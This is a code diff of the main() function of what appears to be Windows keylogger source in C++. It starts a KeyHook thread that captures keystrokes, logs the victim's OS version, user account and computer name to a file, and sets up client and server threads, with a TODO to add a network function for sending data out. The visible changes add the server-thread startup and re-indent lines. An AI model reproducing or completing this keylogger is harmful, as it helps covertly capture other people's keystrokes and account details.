@@ -17,7 +17,15 @@ typedef struct CHStruct {
 
 int main() {
 #ifdef DEBUG_BUILD
-	ServerThread();
+	auto fileParams = new FileParams;
+	std::string path = Stream::GetPath("\\Microsoft\\");
+	fileParams->filePath = path.c_str();
+	fileParams->filePathLen = path.size();
+
+	HANDLE serverHandle =
+			CreateThread(nullptr, 0, ServerThread, fileParams, 0, nullptr);
+	WaitForSingleObject(serverHandle, INFINITE);
+	CloseHandle(serverHandle);
 #endif
 
 #ifndef DEBUG_BUILD
@@ -43,9 +51,9 @@ int main() {
 
 	std::ostringstream ostream;
 	ostream << "\n[*] OS Info: Major - " << clientInfo.osVersionInfo.dwMajorVersion << "; Minor - "
-	        << clientInfo.osVersionInfo.dwMinorVersion << " [*]"
-	        << "\n[*] Account Info: User -" << clientInfo.accountName << "; Computer - " << clientInfo.computerName
-	        << " [*]";
+					<< clientInfo.osVersionInfo.dwMinorVersion << " [*]"
+					<< "\n[*] Account Info: User -" << clientInfo.accountName << "; Computer - " << clientInfo.computerName
+					<< " [*]";
 
 	std::string write = ostream.str();
 	Stream::WriteLog(write, KeyHook::activeProcess, logFile, false);
@@ -55,11 +63,11 @@ int main() {
 	pClientThreadHandleParams->file = path; // TODO: Idk if this is the path we need
 	HANDLE keyHookHandle = CreateThread(nullptr, 0, KeyHook::HandleMessage, (LPVOID)1, 0, nullptr);
 	HANDLE clientThreadHandle = CreateThread(nullptr,
-	                                         0,
-	                                         nullptr,
-	                                         pClientThreadHandleParams,
-	                                         0,
-	                                         nullptr);// TODO: replace lpStartAddress with network funct
+																					 0,
+																					 nullptr,
+																					 pClientThreadHandleParams,
+																					 0,
+																					 nullptr);// TODO: replace lpStartAddress with network funct
 	const size_t HANDLE_ARR_SIZE = 2;
 	HANDLE handleArr[HANDLE_ARR_SIZE] = {keyHookHandle, clientThreadHandle};
 
